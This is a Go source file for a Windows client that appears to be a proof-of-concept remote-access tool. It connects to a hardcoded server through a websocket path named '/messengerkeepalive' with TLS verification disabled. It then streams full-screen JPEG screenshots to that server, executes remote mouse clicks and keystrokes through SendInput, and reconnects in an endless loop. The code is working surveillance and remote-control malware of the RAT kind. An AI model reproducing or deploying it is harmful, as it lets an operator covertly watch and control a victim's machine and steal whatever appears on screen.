package main

import (
	"bytes"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"image"
	"image/jpeg"
	"log"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/gorilla/websocket"
	win "github.com/lxn/win"
	"github.com/nfnt/resize"
)

var (
	// change this
	ADDR = flag.String("addr", "192.168.56.1:6969", "Server Endpoint")
	PATH = "/messengerkeepalive"

	// maybe change this
	DEFAULT_SCALER  = 1
	DEFAULT_FPS     = 1
	DEFAULT_QUALITY = 20

	// do not change this
	WIDTH            = int(win.GetSystemMetrics(win.SM_CXSCREEN))
	HEIGHT           = int(win.GetSystemMetrics(win.SM_CYSCREEN))
	HDC              = win.GetDC(0)
	HEADER           = GetBitmapHeader(WIDTH, HEIGHT)
	IMG              = image.NewRGBA(image.Rect(0, 0, WIDTH, HEIGHT))
	MEMORY_DEVICE    = win.CreateCompatibleDC(HDC)
	BITMAP           = win.CreateCompatibleBitmap(HDC, int32(WIDTH), int32(HEIGHT))
	BITMAP_DATA_SIZE = uintptr(((int64(WIDTH)*int64(HEADER.BiBitCount) + 31) / 32) * 4 * int64(HEIGHT))
	HMEM             = win.GlobalAlloc(win.GMEM_MOVEABLE, BITMAP_DATA_SIZE)
	dllUser32        = syscall.NewLazyDLL("user32.dll")
	fSendInput       = dllUser32.NewProc("SendInput")
	fVkKeyScanA      = dllUser32.NewProc("VkKeyScanA")
)

// https://pkg.go.dev/github.com/stephen-fox/user32util
const (
	MouseEventFAbsolute       uint32 = 0x8000
	MouseEventFHWheel         uint32 = 0x01000
	MouseEventFMove           uint32 = 0x0001
	MouseEventFMoveNoCoalesce uint32 = 0x2000
	MouseEventFLeftDown       uint32 = 0x0002
	MouseEventFLeftUp         uint32 = 0x0004
	MouseEventFRightDown      uint32 = 0x0008
	MouseEventFRightUp        uint32 = 0x0010
	MouseEventFMiddleDown     uint32 = 0x0020
	MouseEventFMiddleUp       uint32 = 0x0040
	MouseEventFVirtualDesk    uint32 = 0x4000
	MouseEventFWheel          uint32 = 0x0800
	MouseEventFXDown          uint32 = 0x0080
	MouseEventFXUp            uint32 = 0x0100
)

type MouseInput struct {
	Dx          int32
	Dy          int32
	MouseData   uint32
	DwFlags     uint32
	Time        uint32
	DwExtraInfo uintptr
}

type KeyboardInput struct {
	WVK         uint16
	WScan       uint16
	DwFlags     uint32
	Time        uint32
	DwExtraInfo uintptr
}

type ParamMouseInput struct {
	inputType uint32
	in        MouseInput
	//padding   uint64
}

type ParamKeyboardInput struct {
	inputType uint32
	ki        KeyboardInput
	padding   uint64
}

func main() {
	flag.Parse()
	log.SetFlags(0)

	for {
		err := handleConnection()
		if err != nil {
			fmt.Println("Restarting...")
			time.Sleep(time.Second * 5)
		}
	}
}

// issue a click using SendInput() of user32
func click(x int32, y int32, secondary bool) {

	var i ParamMouseInput

	i.inputType = 0 // INPUT_MOUSE
	i.in.Dx = x
	i.in.Dy = y

	if secondary {
		i.in.DwFlags = MouseEventFMove | MouseEventFRightDown | MouseEventFRightUp | MouseEventFAbsolute
	} else {
		i.in.DwFlags = MouseEventFMove | MouseEventFLeftDown | MouseEventFLeftUp | MouseEventFAbsolute
	}

	i.in.Time = 0
	i.in.DwExtraInfo = 0
	i.in.MouseData = 0
	_, _, _ = fSendInput.Call(
		1,
		uintptr(unsafe.Pointer(&i)),
		uintptr(unsafe.Sizeof(i)),
	)

}

func TriggerClick(rawMessage string, secondary bool) {
	splitMessage := strings.Split(rawMessage, " ")
	if len(splitMessage) != 3 {
		return
	}
	_val, err := strconv.ParseInt(splitMessage[1], 10, 32)
	if err != nil {
		log.Printf("TAP Error: Corrupt X Value")
	}
	tap_x := int32(_val)
	_val, err = strconv.ParseInt(splitMessage[2], 10, 32)
	if err != nil {
		log.Printf("TAP Error: Corrupt Y Value")
	}
	tap_y := int32(_val)
	click(tap_x, tap_y, secondary)
}

// issue a keyboard event using SendInput() of user32
func TriggerKey(rawMessage string) {
	splitMessage := strings.Split(rawMessage, " ")
	var i ParamKeyboardInput

	i.ki.Time = 0
	i.ki.DwExtraInfo = 0

	i.inputType = 1 //INPUT_KEYBOARD

	flags := 0

	// normal key
	if len(splitMessage[1]) == 1 {
		ret, _, err := fVkKeyScanA.Call(uintptr(splitMessage[1][0]))
		if err != nil {
			keycode := ret & 0xff
			flags = int((ret >> 8) & 0xff)

			// shift down
			if flags == 1 {
				i.ki.WVK = 0xA0
				i.ki.DwFlags = 0
				_, _, _ = fSendInput.Call(
					1,
					uintptr(unsafe.Pointer(&i)),
					uintptr(unsafe.Sizeof(i)),
				)
			}

			i.ki.DwFlags = 0
			i.ki.WVK = uint16(keycode)
		}
	} else {
		// special key
		// this is a poc, implement this yourself if you really need stuff like F10 lol
		switch splitMessage[1] {
		case "Return":
			// https://docs.microsoft.com/de-de/windows/win32/inputdev/virtual-key-codes
			i.ki.WVK = 0x0D
		case "BackSpace":
			i.ki.WVK = 0x08
		case "Left":
			i.ki.WVK = 0x25
		case "Up":
			i.ki.WVK = 0x26
		case "Right":
			i.ki.WVK = 0x27
		case "Down":
			i.ki.WVK = 0x28
		case "LeftSuper":
			i.ki.WVK = 0x5B
		case "RightSuper":
			i.ki.WVK = 0x5C
		case "Escape":
			i.ki.WVK = 0x1B
		case "Space":
			i.ki.WVK = 0x20
		default:
		}
	}

	_, _, _ = fSendInput.Call(
		1,
		uintptr(unsafe.Pointer(&i)),
		uintptr(unsafe.Sizeof(i)),
	)

	if flags == 1 {
		// shift up
		i.ki.WVK = 0xA0
		i.ki.DwFlags = 0x0002
		_, _, _ = fSendInput.Call(
			1,
			uintptr(unsafe.Pointer(&i)),
			uintptr(unsafe.Sizeof(i)),
		)
	}
	//fmt.Println(err.Error())
}

func handleConnection() error {
	fps := time.Duration(DEFAULT_FPS)
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)
	server := url.URL{Scheme: "wss", Host: *ADDR, Path: PATH}
	dialer := *websocket.DefaultDialer
	// yolo
	dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	connection, _, err := dialer.Dial(server.String(), nil)
	if err != nil {
		//log.Fatal("dial:", err)
		return err
	}
	defer connection.Close()

	// channel between go funcs and main thread
	done := make(chan struct{})

	ticker := time.NewTicker(time.Second / fps)
	defer ticker.Stop()

	// Handle incoming messages
	go func() {
		defer close(done)
		for {
			if connection == nil {
				time.Sleep(time.Second * 5)
				continue
			}
			messageType, message, err := connection.ReadMessage()
			if err != nil {
				return
			}

			if messageType != websocket.TextMessage {
				continue
			}

			strMessage := string(message)

			splitMessage := strings.Split(strMessage, " ")
			opcode := splitMessage[0]
			switch opcode {
			case "FPS":
				if len(splitMessage) == 2 {
					fps_int, err := strconv.Atoi(splitMessage[1])
					if err != nil {
						log.Printf("FPS: Corrupt FPS Number")
					} else {
						fps = time.Duration(fps_int)
						ticker.Reset(time.Second / fps)
					}
				} else {
					log.Printf("FPS: Missing FPS Number")
				}
			case "SCL":
				if len(splitMessage) == 2 {
					scaler_int, err := strconv.Atoi(splitMessage[1])
					if err != nil {
						log.Printf("SCL: Corrupt Scaler Number")
					} else {
						DEFAULT_SCALER = scaler_int
					}
				} else {
					log.Printf("SCL: Missing SCL Number")
				}
			case "QUL":
				if len(splitMessage) == 2 {
					quality_int, err := strconv.Atoi(splitMessage[1])
					if err != nil {
						log.Printf("QUL: Corrupt QUL Number")
					} else {
						DEFAULT_QUALITY = quality_int
					}
				} else {
					log.Printf("QUL: Missing QUL Number")
				}
			case "LCL":
				TriggerClick(strMessage, false)
			case "RCL":
				TriggerClick(strMessage, true)
			case "KEY":
				TriggerKey(strMessage)
			default:
				log.Printf("unknown cmd")
			}
		}
	}()

	for {
		if connection == nil {
			time.Sleep(time.Second * 5)
			continue
		}
		select {
		case <-done:
			return errors.New("gofunc failed")
		case <-ticker.C:
			err := connection.WriteMessage(websocket.BinaryMessage, GetOneJPGAsBytes())
			//log.Println("sent one")
			if err != nil {
				continue
			}
		case <-interrupt:
			log.Println("interrupt")

			// Cleanly close the connection by sending a close message and then
			// waiting (with timeout) for the server to close the connection.
			err := connection.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
			if err != nil {
				log.Println("write close:", err)
				return err
			}
		default:
			continue
			//return
		}
	}

}

func GetBitmapHeader(width, height int) (header win.BITMAPINFOHEADER) {
	header.BiSize = uint32(unsafe.Sizeof(header))
	header.BiPlanes = 1
	header.BiBitCount = 32
	header.BiWidth = int32(width)
	header.BiHeight = int32(-height)
	header.BiCompression = win.BI_RGB
	header.BiSizeImage = 0

	return header
}

func GetOneJPGAsBytes() []byte {
	resultBuf := new(bytes.Buffer)
	tempImage, err := _GetOneRaw()
	if err != nil {
		os.Exit(-1)
	}

	resizedImage := resize.Resize(uint(tempImage.Bounds().Dx()/DEFAULT_SCALER), 0, tempImage, resize.Lanczos3)

	// Encode to jpeg
	err = jpeg.Encode(resultBuf, resizedImage, &jpeg.Options{Quality: DEFAULT_QUALITY})

	if err != nil {
		log.Panic(err)
	}

	return resultBuf.Bytes()
}

func _GetOneRaw() (*image.RGBA, error) {

	memptr := win.GlobalLock(HMEM)
	defer win.GlobalUnlock(HMEM)

	old := win.SelectObject(MEMORY_DEVICE, win.HGDIOBJ(BITMAP))
	if old == 0 {
		return nil, errors.New("SelectObject failed")
	}
	defer win.SelectObject(MEMORY_DEVICE, old)

	if !win.BitBlt(MEMORY_DEVICE, 0, 0, int32(WIDTH), int32(HEIGHT), HDC, 0, 0, win.SRCCOPY) {
		return nil, errors.New("BitBlt failed")
	}

	if win.GetDIBits(HDC, BITMAP, 0, uint32(HEIGHT), (*uint8)(memptr), (*win.BITMAPINFO)(unsafe.Pointer(&HEADER)), win.DIB_RGB_COLORS) == 0 {
		return nil, errors.New("GetDIBits failed")
	}

	i := 0
	src := uintptr(memptr)
	for y := 0; y < HEIGHT; y++ {
		for x := 0; x < WIDTH; x++ {
			v0 := *(*uint8)(unsafe.Pointer(src))
			v1 := *(*uint8)(unsafe.Pointer(src + 1))
			v2 := *(*uint8)(unsafe.Pointer(src + 2))

			// BGRA => RGBA, and set A to 255
			IMG.Pix[i], IMG.Pix[i+1], IMG.Pix[i+2], IMG.Pix[i+3] = v2, v1, v0, 255

			i += 4
			src += 4
		}
	}

	return IMG, nil
}
